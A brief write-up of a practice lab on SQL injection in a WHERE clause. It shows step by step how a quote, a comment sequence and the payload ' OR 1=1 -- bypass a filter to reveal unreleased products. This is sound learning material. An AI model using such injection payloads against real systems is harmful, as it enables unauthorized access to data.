# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Query:** SELECT * FROM products WHERE category = 'Gifts' AND released = 1

**End Goal:** Display one or more unreleased products

**Analysis**

SELECT * FROM products WHERE category = ''' AND released = 1

*Returned Internal Server Error page so SQL injection will work. Let's try making the rest of it a comment.*

SELECT * FROM products WHERE category = ''--' AND released = 1

*Worked. That means I can add something that shows one or more unreleased products before the comment.*

**Answer:** SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1



